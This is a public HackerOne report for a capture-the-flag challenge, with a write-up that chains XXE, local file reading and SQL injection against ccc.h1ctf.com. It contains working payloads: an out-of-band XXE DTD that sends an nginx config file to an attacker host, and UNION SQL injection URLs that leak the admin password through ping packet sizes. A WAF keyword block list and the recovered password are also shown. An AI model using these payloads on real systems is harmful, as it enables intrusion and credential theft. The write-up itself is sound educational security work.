{
  "id": 1215919,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjE1OTE5",
  "url": "https://hackerone.com/reports/1215919",
  "title": "ccc.h1ctf.com CTF",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2021-06-03T00:44:27.031Z",
  "submitted_at": "2021-06-03T00:44:27.110Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "erbbysam",
    "url": "/erbbysam",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-06-18T04:59:16.408Z",
  "bug_reporter_agreed_on_going_public_at": "2021-06-17T22:50:43.440Z",
  "team_member_agreed_on_going_public_at": "2021-06-18T04:59:16.298Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nClaiming the flag, writeup to follow.\n██████████\n██████\n\n## Impact\n\n.",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [

  ],
  "allow_singular_disclosure_at": "2021-07-17T22:50:43.516Z",
  "allow_singular_disclosure_after": -68890873.9419164,
  "singular_disclosure_allowed": true,
  "vote_count": 6,
  "voters": [
    "0xwise",
    "ekgaribadmi",
    "sandip5x05",
    "roughfox",
    "deadeye88",
    "meispi"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 72510,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.ccc.h1ctf.com",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 11967215,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "# Write-up\n\nThis write-up is divided into 3 sections:\n1) XXE -- identification\n2) LFI -- configuration file exfiltration via Out-of-band XXE\n3) SQLi -- admin password exfiltration via ping packet sizes\n\n## Step 1: XXE -- identification\n\nVisiting https://ccc.h1ctf.com/ we are greeted with 3 links, without much functionality:\nhttps://ccc.h1ctf.com/login\nhttps://ccc.h1ctf.com/register\nhttps://twitter.com/DesignsCcc\n\nRegistering, we are \"logged in\" with and forwarded to a page such as https://ccc.h1ctf.com/u/81yeep where `81yeep` is the user hash\n\nLoading the page, we are greeted by a warning:\n`Critical : Remote File list not found`\n\nThe third link to twitter is actually the most interesting link!\nhttps://twitter.com/DesignsCcc/status/1398629597298806786\n\nThis tweet contains an image:\n{F1324456}\n\nLooking closely we can see a tab open to the page:\nhttps://ccc.h1ctf.com/error_-_-_log.txt\n\nVisiting that link, we get the content:\n```\nFile: https://h1-wfzfi4.s3.eu-west-2.amazonaws.com/files.xml Not Found\nFile: https://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml Not Found\nFile: https://h1-y0c9ov.s3.eu-west-2.amazonaws.com/files.xml Not Found\nFile: https://h1-56qw4c.s3.eu-west-2.amazonaws.com/files.xml Not Found\nFile: https://h1-6hin8w.s3.eu-west-2.amazonaws.com/files.xml Not Found\n```\n\nLooking closely, the \"Remote File list\" mentioned above appears to be gathered from aws at the url:\n`https://h1-<user hash>.s3.eu-west-2.amazonaws.com/files.xml`\n\nAdditionally, some of the paths in the error log above contain XXE payloads such as:\nhttps://h1-y0c9ov.s3.amazonaws.com/files.xml\n```\n<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"The espurr purrs\"> %ext;\n]>\n<r></r>\n```\n\nPlacing a simple XXE payload containing a Burp Collaborator callback in a public S3 file:\nhttps://h1-81yeep.s3.amazonaws.com/files.xml\n\nWe receive a DNS & HTTP hit and the following error on https://ccc.h1ctf.com/u/81yeep (on page refresh):\n`Critical : Invalid XML detected`\n\nWith a working XXE payload, we move to step two.\n\n## Step 2: LFI -- configuration file exfiltration via Out-of-band XXE\n\nWe are given a hint for this step in the following tweet:\nhttps://twitter.com/DesignsCcc/status/1398981963625676802\n`Does anyone know if in nginx you can link a directory to a proxy_pass?`\n\nSetting up a 2 stage XXE payload to exfiltrate data, we place the following on https://h1-81yeep.s3.amazonaws.com/files.xml: \n```\n<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM \"http://x.x.x.x/dtd.xml\">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>\n```\n\nAnd on `http://x.x.x.x/dtd.xml`:\n```\n<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default\">\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://x.x.x.x/?%data;'>\">\n```\n\nWe then refresh https://ccc.h1ctf.com/u/81yeep and receive the following callback:\n\n```\n\"GET /?IyMKIyBZb3Ugc2hvdWxkIGxvb2sgYXQgdGhlIGZvbGxvd2luZyBVUkwncyBpbiBvcmRlciB0byBncmFzcCBhIHNvbGlkIHVuZGVyc3RhbmRpbmcKIyBvZiBOZ2lueCBjb25maWd1cmF0aW9uIGZpbGVzIGluIG9yZGVyIHRvIGZ1bGx5IHVubGVhc2ggdGhlIHBvd2VyIG9mIE5naW54LgojIGh0dHBzOi8vd3d3Lm5naW54LmNvbS9yZXNvdXJjZXMvd2lraS9zdGFydC8KIyBodHRwczovL3d3dy5uZ2lueC5jb20vcmVzb3VyY2VzL3dpa2kvc3RhcnQvdG9waWNzL3R1dG9yaWFscy9jb25maWdfcGl0ZmFsbHMvCiMgaHR0cHM6Ly93aWtpLmRlYmlhbi5vcmcvTmdpbngvRGlyZWN0b3J5U3RydWN0dXJlCiMKIyBJbiBtb3N0IGNhc2VzLCBhZG1pbmlzdHJhdG9ycyB3aWxsIHJlbW92ZSB0aGlzIGZpbGUgZnJvbSBzaXRlcy1lbmFibGVkLyBhbmQKIyBsZWF2ZSBpdCBhcyByZWZlcmVuY2UgaW5zaWRlIG9mIHNpdGVzLWF2YWlsYWJsZSB3aGVyZSBpdCB3aWxsIGNvbnRpbnVlIHRvIGJlCiMgdXBkYXRlZCBieSB0aGUgbmdpbnggcGFja2FnaW5nIHRlYW0uCiMKIyBUaGlzIGZpbGUgd2lsbCBhdXRvbWF0aWNhbGx5IGxvYWQgY29uZmlndXJhdGlvbiBmaWxlcyBwcm92aWRlZCBieSBvdGhlcgojIGFwcGxpY2F0aW9ucywgc3VjaCBhcyBEcnVwYWwgb3IgV29yZHByZXNzLiBUaGVzZSBhcHBsaWNhdGlvbnMgd2lsbCBiZSBtYWRlCiMgYXZhaWxhYmxlIHVuZGVybmVhdGggYSBwYXRoIHdpdGggdGhhdCBwYWNrYWdlIG5hbWUsIHN1Y2ggYXMgL2RydXBhbDguCiMKIyBQbGVhc2Ugc2VlIC91c3Ivc2hhcmUvZG9jL25naW54LWRvYy9leGFtcGxlcy8gZm9yIG1vcmUgZGV0YWlsZWQgZXhhbXBsZXMuCiMjCgojIERlZmF1bHQgc2VydmVyIGNvbmZpZ3VyYXRpb24KIwojc2VydmVyIHsKIyAgICAgICAgbGlzdGVuIDgwIGRlZmF1bHRfc2VydmVyOwojICAgICAgICBsaXN0ZW4gWzo6XTo4MCBkZWZhdWx0X3NlcnZlcjsKIwojICAgICAgICByb290IC92YXIvd3d3L2h0bWw7CiMKIyAgICAgICAgIyBBZGQgaW5kZXgucGhwIHRvIHRoZSBsaXN0IGlmIHlvdSBhcmUgdXNpbmcgUEhQCiMgICAgICAgIGluZGV4IGluZGV4Lmh0bWwgaW5kZXguaHRtIGluZGV4Lm5naW54LWRlYmlhbi5odG1sOwojCiMgICAgICAgIHNlcnZlcl9uYW1lIF87CiMKIyAgICAgICAgbG9jYXRpb24gLyB7CiMgICAgICAgICAgICAgICAgdHJ5X2ZpbGVzICR1cmkgJHVyaS8gPTQwNDsKIyAgICAgICAgfSAgICAgICAKI30KCiNzZXJ2ZXIgewojICAgIHNlcnZlcl9uYW1lIGNjYy5oMWN0Zi5jb207CiMgICAgcm9vdCAvdmFyL3d3dy9hcHAvcHVibGljOwojICAgIGluZGV4IGluZGV4LnBocDsKIyAgICBsb2NhdGlvbiAvIHsKIyAgICAgICAgICAgIHRyeV9maWxlcyAkdXJpICR1cmkvIC9pbmRleC5waHA/JHF1ZXJ5X3N0cmluZzsKIyAgICB9CiMgICAgIGxvY2F0aW9uIC8yYjVkMmIxMTUxM2QyYzliIHsKIyAgICAgICBwcm94eV9wYXNzIGh0dHA6Ly8xMjcuMC4wLjE6ODg4ODsKIyAgICAgfQojCiMgICAgbG9jYXRpb24gfiBcLnBocCQgewojICAgICAgICAgICAgaW5jbHVkZSBzbmlwcGV0cy9mYXN0Y2dpLXBocC5jb25mOwojICAgICAgICAgICAgZmFzdGNnaV9wYXNzIHVuaXg6L3Zhci9ydW4vcGhwL3BocDcuNC1mcG0uc29jazsKIyAgICB9CiMgICAgbGlzdGVuIDQ0MyBzc2w7CiMgICAgc3NsX2NlcnRpZmljYXRlIC9ldGMvbGV0c2VuY3J5cHQvbGl2ZS9jY2MuaDFjdGYuY29tL2Z1bGxjaGFpbi5wZW07CiMgICAgc3NsX2NlcnRpZmljYXRlX2tleSAvZXRjL2xldHNlbmNyeXB0L2xpdmUvY2NjLmgxY3RmLmNvbS9wcml2a2V5LnBlbTsKIyAgICBpbmNsdWRlIC9ldGMvbGV0c2VuY3J5cHQvb3B0aW9ucy1zc2wtbmdpbnguY29uZjsKIyAgICBzc2xfZGhwYXJhbSAvZXRjL2xldHNlbmNyeXB0L3NzbC1kaHBhcmFtcy5wZW07CiN9Cgojc2VydmVyIHsKIyAgICBpZiAoJGhvc3QgPSBjY2MuaDFjdGYuY29tKSB7CiMgICAgICAgIHJldHVybiAzMDEgaHR0cHM6Ly8kaG9zdCRyZXF1ZXN0X3VyaTsKIyAgICB9CiMgICAgbGlzdGVuIDgwOwojICAgIHNlcnZlcl9uYW1lIGNjYy5oMWN0Zi5jb207CiMgICAgcmV0dXJuIDQwNDsKI30K HTTP/1.0\" 200 -\n```\n\nNote that a `php://filter` handler worked here! There was a lot of brute forcing here attempting to find the right file/XXE technique :) \n\nDecoding the base64 above, we see the following relevant configuration:\n```\n#     location /2b5d2b11513d2c9b {\n#       proxy_pass http://127.0.0.1:8888;\n#     }\n```\n\nThis leads us to https://ccc.h1ctf.com/2b5d2b11513d2c9b\n\n# SQLi -- admin password exfiltration via ping packet sizes\n\n{F1324459}\n\nVisiting https://ccc.h1ctf.com/2b5d2b11513d2c9b we are greeted with a login page.\n\nThere is not a lot of functionality here so I ran dirsearch over this URL and it noted that https://ccc.h1ctf.com/2b5d2b11513d2c9b/.git/config existed with the following contents:\n```\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/ccc-labs/pinger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\n\nVisiting https://github.com/ccc-labs/pinger, we quickly identify a SQL injection vulnerability:\nhttps://github.com/ccc-labs/pinger/blob/main/_pingercode_/models/Ping.php#L11\n\nHowever, this is behind a full 1 minute cool down between requests, clearly we are not going to be able to run sqlmap quickly here:\nhttps://github.com/ccc-labs/pinger/blob/main/_pingercode_/controllers/Pinger.php#L67\n\nAdditionally, there is no obvious out of band vector for a successful SQLi exploit. This is not just due to timing constraints (1 request/min) but also a \"WAF\" that blocks keywords we would need for a timing attack:\nhttps://github.com/ccc-labs/pinger/blob/main/_pingercode_/waf.php#L6\n```\n$banned_words = array('1=1','sleep','script','benchmark','alert','xss','onerror');\n```\n\nLooking back at the SQLi:\nhttps://github.com/ccc-labs/pinger/blob/main/_pingercode_/models/Ping.php#L10\n```\n    public static function send( $id ){\n        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';\n        $d = Db::connect()->prepare($sql);\n        $d->execute();\n        //Confirm we've found a matching row in the database\n        if( $d->rowCount() == 1 ){\n            $host = $d->fetch();\n            $ip = $host[\"ip\"];\n            $packet_size = intval($host[\"packet_size\"]);\n            //make sure PING packet size between 1 and 65527\n            if( $packet_size > 0 && $packet_size < 65528 ) {\n                //check IP is a valid IPv4 Address\n                if (filter_var($ip, FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {\n                    //SEND 4 PING PACKETS IN THE BACKGROUND\n                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');\n                }\n            }\n        }\n    }\n```\n\nWe see the output of this command is fed into a ping command. If we could control the SQL output, there are two ways we could maybe use the ping command to our advantage:\n1) we could inject a subcomand and achieve RCE -- this is blocked by the php `intval` and `filter_var` functions which we cannot bypass\n2) we could ping our own server and use the packet size to exfiltrate data? -- lets try this\n\nSetting up a SQL query, and getting it right the first time is important due to the full minute cool down per request. To build the perfect query I used http://sqlfiddle.com/ :\nSchema:\n```\nCREATE TABLE `host` (\n                        `id` int(11) NOT NULL,\n                        `ip` varchar(15) NOT NULL DEFAULT '',\n                        `packet_size` int(11) NOT NULL DEFAULT '1'\n) ENGINE=InnoDB DEFAULT CHARSET=latin1;\n\nINSERT INTO `host` (`id`, `ip`, `packet_size`) VALUES\n(1, '8.8.8.8', 32),\n(2, '127.0.0.1', 32),\n(3, '8.8.4.4', 32);\n\nCREATE TABLE `user` (\n                        `id` int(11) NOT NULL,\n                        `username` varchar(250) NOT NULL,\n                        `password` varchar(250) NOT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=latin1;\n\nINSERT INTO `user` (`id`, `username`, `password`) VALUES\n(1, 'admin', 'password');\n```\nQuery:\n```\nselect * from host where id = 55 union all select 1,\"x.x.x.x\",ASCII(SUBSTRING((select password from user where username=\"admin\"),1,1)) LIMIT 1;\n```\nNote the use of an invalid ID here combined with the `union all` to control the output of the SQL query. Using the query above, we will step through the admin password, letter by letter converting it to it's ASCII int value and using that for the packet size! For example, for the first letter we will use a payload of:\n```\n55 union all select 1,\"x.x.x.x\",ASCII(SUBSTRING((select password from user where username=\"admin\"),1,1))\nURL: https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=55+union+all+select+1%2C%22x.x.x.x%22%2CASCII%28SUBSTRING%28%28select+password+from+user+where+username%3D%22admin%22%29%2C1%2C1%29%29\n```\nAnd the second:\n```\n55 union all select 1,\"x.x.x.x\",ASCII(SUBSTRING((select password from user where username=\"admin\"),2,1))\nURL: https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=55+union+all+select+1%2C%22x.x.x.x%22%2CASCII%28SUBSTRING%28%28select+password+from+user+where+username%3D%22admin%22%29%2C2%2C1%29%29\n```\n\nAnd now we wait... Each letter took a minute as we had to wait for the server to allow another request through\n\nExample ping to a server I control for the 3rd letter of the password:\n```\n# tcpdump ip proto \\\\icmp\n23:55:55.595798 IP ec2-18-216-97-43.us-east-2.compute.amazonaws.com > x.x.x.x: ICMP echo request, id 113, seq 1, length 63\n23:55:55.595888 IP x.x.x.x > ec2-18-216-97-43.us-east-2.compute.amazonaws.com: ICMP echo reply, id 113, seq 1, length 63\n23:55:56.597377 IP ec2-18-216-97-43.us-east-2.compute.amazonaws.com > x.x.x.x: ICMP echo request, id 113, seq 2, length 63\n23:55:56.597447 IP x.x.x.x > ec2-18-216-97-43.us-east-2.compute.amazonaws.com: ICMP echo reply, id 113, seq 2, length 63\n23:55:57.598917 IP ec2-18-216-97-43.us-east-2.compute.amazonaws.com > x.x.x.x: ICMP echo request, id 113, seq 3, length 63\n23:55:57.598990 IP x.x.x.x > ec2-18-216-97-43.us-east-2.compute.amazonaws.com: ICMP echo reply, id 113, seq 3, length 63\n23:55:58.600448 IP ec2-18-216-97-43.us-east-2.compute.amazonaws.com > x.x.x.x: ICMP echo request, id 113, seq 4, length 63\n23:55:58.600522 IP x.x.x.x > ec2-18-216-97-43.us-east-2.compute.amazonaws.com: ICMP echo reply, id 113, seq 4, length 63\n\n```\n\n```\nletter ID | data size | ASCII Value\n1 93 85\n2 108 100\n3 63 55\n4 65 57\n5 102 94\n6 57 49\n7 80 72\n8 80 72\n9 82 74\n10 44 36\n11 95 87\n12 50 42\n13 81 73\n14 87 79\n15 106 98\n16 105 97\n17 83 75\n18 108 100\n19 89 81\n20 111 103\n21 81 73\n```\n\nNote that in each response above, I had to subtract 8 to account for the ICMP header size. That gives us our final password: `Ud79^1HHJ$W*IObaKdQgI`\n\nLogging in with `admin:Ud79^1HHJ$W*IObaKdQgI` we are greeted with the flag!\n██████\n\nThanks for an awesome challenge!\n-Sam",
      "automated_response": false,
      "created_at": "2021-06-03T03:42:50.344Z",
      "updated_at": "2021-06-17T21:39:11.345Z",
      "actor": {
        "username": "erbbysam",
        "cleared": true,
        "verified": true,
        "url": "/erbbysam",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1324459,
          "filename": "2.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/znmcdjox5ixn9djgzgstjbkoggnn?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071157Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=25824582b422c6208421022b4200c6b9b2ed7fec9a98b5d835890d1940324136"
        },
        {
          "id": 1324456,
          "filename": "1.jpeg",
          "type": "image/jpeg",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/x97j3y5b01rqw9fogsn1i9ek36e3?response-content-disposition=attachment%3B%20filename%3D%221.jpeg%22%3B%20filename%2A%3DUTF-8%27%271.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071157Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9f9cbec7451e91ea045ee64145eecd11d82ce9edf085e7f462102850f7ebd151"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 11979102,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Thank you for participating in the CCC CTF! ",
      "automated_response": false,
      "created_at": "2021-06-03T19:45:57.099Z",
      "updated_at": "2021-06-03T19:45:57.099Z",
      "actor": {
        "username": "nahamsec",
        "cleared": true,
        "verified": true,
        "url": "/nahamsec",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 12160787,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Hi @erbbysam  - Congrats on being one of the first 5 to submit the flag for CCC and nice work with the write-up!\n\nI have redacted and removed any references to the flag including some of your screenshots. If you chose to release your own write-up, please make sure to remove the flag from your post. Thanks again and happy hacking!",
      "automated_response": false,
      "created_at": "2021-06-17T21:41:47.792Z",
      "updated_at": "2021-06-17T21:41:47.792Z",
      "actor": {
        "username": "nahamsec",
        "cleared": true,
        "verified": true,
        "url": "/nahamsec",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "erbbysam",
        "url": "/erbbysam"
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 12160788,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2021-06-17T21:41:57.481Z",
      "updated_at": "2021-06-17T21:41:57.481Z",
      "actor": {
        "url": "/h1-ctf",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "h1-ctf"
        }
      },
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "h1-ctf",
      "collaborator": {
        "username": "erbbysam",
        "url": "/erbbysam"
      }
    },
    {
      "id": 12161172,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2021-06-17T22:50:43.478Z",
      "updated_at": "2021-06-17T22:50:43.478Z",
      "first_to_agree": true,
      "actor": {
        "username": "erbbysam",
        "cleared": true,
        "verified": true,
        "url": "/erbbysam",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 12162484,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2021-06-18T04:59:16.322Z",
      "updated_at": "2021-06-18T04:59:16.322Z",
      "actor": {
        "username": "nahamsec",
        "cleared": true,
        "verified": true,
        "url": "/nahamsec",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "h1-ctf"
    },
    {
      "id": 12162485,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2021-06-18T04:59:16.449Z",
      "updated_at": "2021-06-18T04:59:16.449Z",
      "actor": {
        "username": "nahamsec",
        "cleared": true,
        "verified": true,
        "url": "/nahamsec",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
